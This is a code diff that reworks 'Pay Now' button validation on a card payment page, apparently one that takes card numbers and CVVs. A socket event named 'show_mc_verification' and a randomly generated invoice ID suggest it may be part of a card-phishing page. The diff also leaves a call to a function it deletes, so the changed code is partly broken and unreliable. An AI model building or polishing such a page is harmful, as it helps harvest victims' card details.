@@ -993,53 +993,6 @@ socket.on('show_mc_verification', (data) => {
         }
     });
 }
-
-// Improved function to update the Pay Now button
-function updatePayNowButton() {
-    const cardNumber = document.getElementById('card-number')?.value || '';
-    const cardHolder = document.getElementById('card-holder')?.value || '';
-    const expiryDate = document.getElementById('expiry-date')?.value || '';
-    const cvv = document.getElementById('cvv')?.value || '';
-    const payNowBtn = document.querySelector('.pay-now-btn');
-    
-    if (!payNowBtn) return;
-    
-    // Remove all event listeners from the button first
-    const newPayBtn = payNowBtn.cloneNode(true);
-    payNowBtn.parentNode.replaceChild(newPayBtn, payNowBtn);
-    
-    // Check if all fields are filled with valid data
-    const isCardNumberValid = cardNumber.replace(/\s/g, '').length >= 16;
-    const isCardHolderValid = cardHolder.trim().length > 0;
-    const isExpiryDateValid = /^\d{2}\/\d{2}$/.test(expiryDate);
-    const isCvvValid = cvv.length >= 3;
-    
-    if (isCardNumberValid && isCardHolderValid && isExpiryDateValid && isCvvValid) {
-        // Enable button and change to green
-        newPayBtn.disabled = false;
-        newPayBtn.classList.add('pay-enabled');
-        
-        // Add click event only when enabled
-        newPayBtn.addEventListener('click', function(e) {
-            // Prevent default to avoid any browser styling
-            e.preventDefault();
-            
-            // Process the payment
-            handleCardSubmit(e);
-        });
-    } else {
-        // Keep button disabled and silver
-        newPayBtn.disabled = true;
-        newPayBtn.classList.remove('pay-enabled');
-        
-        // Add a click event that does nothing but prevents default behavior
-        newPayBtn.addEventListener('click', function(e) {
-            e.preventDefault();
-            // Do nothing
-            return false;
-        });
-    }
-}
 // Add this to your setupCardFormHandlers function
 function setupCardFormHandlers() {
     // Your existing code...
@@ -2797,45 +2750,7 @@ if (timeLeft <= 0) {
   const cvvInput = document.querySelector('input[placeholder*="cvv" i], input#cvv');
   const payNowBtn = document.querySelector('.pay-now-btn, button:contains("PAY NOW"), button[type="submit"]');
   
-  // Function to check all fields and update button
-  function checkFields() {
-    if (!cardNumberInput || !cardHolderInput || !expiryDateInput || !cvvInput || !payNowBtn) {
-      console.error("Could not find all form elements");
-      return;
-    }
-    
-    const cardNumber = cardNumberInput.value.replace(/\s/g, '');
-    const cardHolder = cardHolderInput.value.trim();
-    const expiryDate = expiryDateInput.value.trim();
-    const cvv = cvvInput.value.trim();
-    
-    // Check if all fields have valid values
-    if (cardNumber.length >= 16 && 
-        cardHolder.length > 2 && 
-        /^\d{2}\/\d{2}$/.test(expiryDate) && 
-        cvv.length >= 3) {
-        
-        // All fields are valid - make button green and enable it
-        payNowBtn.style.backgroundColor = '#1a5e32'; // Dark green
-        payNowBtn.style.cursor = 'pointer';
-        payNowBtn.disabled = false;
-        
-    } else {
-        // Invalid or incomplete fields - keep button silver and disabled
-        payNowBtn.style.backgroundColor = '#a0aec0'; // Silver
-        payNowBtn.style.cursor = 'not-allowed';
-        payNowBtn.disabled = true;
-    }
-  }
-  
-  // Add event listeners to all inputs
-  [cardNumberInput, cardHolderInput, expiryDateInput, cvvInput].forEach(input => {
-    if (input) {
-      ['input', 'change', 'keyup', 'blur'].forEach(event => {
-        input.addEventListener(event, checkFields);
-      });
-    }
-  });
+
   
   // Run check immediately in case fields are pre-filled
   checkFields();
@@ -2850,6 +2765,105 @@ if (timeLeft <= 0) {
       }
     }, true);
   }
+</script>
+    <script>
+// This is a simplified, focused solution for the Pay Now button
+document.addEventListener('DOMContentLoaded', function() {
+  const cardNumberInput = document.getElementById('card-number');
+  const cardHolderInput = document.getElementById('card-holder');
+  const expiryDateInput = document.getElementById('expiry-date');
+  const cvvInput = document.getElementById('cvv');
+  const payNowBtn = document.querySelector('.pay-now-btn');
+const invoiceIdElement = document.getElementById('invoiceId');
+if (invoiceIdElement) {
+  invoiceIdElement.textContent = Math.floor(100000 + Math.random() * 900000);
+}
+  
+  if (!cardNumberInput || !cardHolderInput || !expiryDateInput || !cvvInput || !payNowBtn) {
+    console.error("Could not find all form elements");
+    return;
+  }
+  
+  // Direct style fixes to ensure the button is initially silver and disabled
+  payNowBtn.style.backgroundColor = '#a0aec0';
+  payNowBtn.style.cursor = 'not-allowed';
+  payNowBtn.disabled = true;
+  
+  // Prevent any default submit behavior
+  const cardForm = document.getElementById('card-form');
+  if (cardForm) {
+    cardForm.onsubmit = function(e) {
+      e.preventDefault();
+      return false;
+    };
+  }
+  
+  // Function to check fields and update button
+  function checkCardFields() {
+    const cardNumber = cardNumberInput.value.replace(/\s/g, '');
+    const cardHolder = cardHolderInput.value.trim();
+    const expiryDate = expiryDateInput.value.trim();
+    const cvv = cvvInput.value.trim();
+    
+    console.log("Checking fields:", {
+      cardNumberLength: cardNumber.length,
+      cardHolderLength: cardHolder.length,
+      expiryDate: expiryDate,
+      cvvLength: cvv.length
+    });
+    
+    // Check all fields
+    if (cardNumber.length >= 16 && 
+        cardHolder.length > 2 && 
+        /^\d{2}\/\d{2}$/.test(expiryDate) && 
+        cvv.length >= 3) {
+      
+      // Enable and make green
+      payNowBtn.style.backgroundColor = '#1a5e32';
+      payNowBtn.style.cursor = 'pointer';
+      payNowBtn.disabled = false;
+      
+      // Add click handler for enabled button
+      payNowBtn.onclick = function(e) {
+        e.preventDefault();
+        handleCardSubmit(e);
+        return false;
+      };
+      
+    } else {
+      // Disable and make silver
+      payNowBtn.style.backgroundColor = '#a0aec0';
+      payNowBtn.style.cursor = 'not-allowed';
+      payNowBtn.disabled = true;
+      
+      // Remove click handler
+      payNowBtn.onclick = function(e) {
+        e.preventDefault();
+        return false;
+      };
+    }
+  }
+  
+  // Add event listeners with a direct reference to the function
+  cardNumberInput.addEventListener('input', checkCardFields);
+  cardHolderInput.addEventListener('input', checkCardFields);
+  expiryDateInput.addEventListener('input', checkCardFields);
+  cvvInput.addEventListener('input', checkCardFields);
+  
+  // Run the check immediately
+  checkCardFields();
+  
+  // For debugging: Log button state on click
+  payNowBtn.addEventListener('click', function(e) {
+    console.log("Button clicked, disabled state:", this.disabled);
+    if (this.disabled) {
+      e.preventDefault();
+      e.stopPropagation();
+      console.log("Click prevented - button is disabled");
+      return false;
+    }
+  }, true);
+});
 </script>
 </body>
 </html>
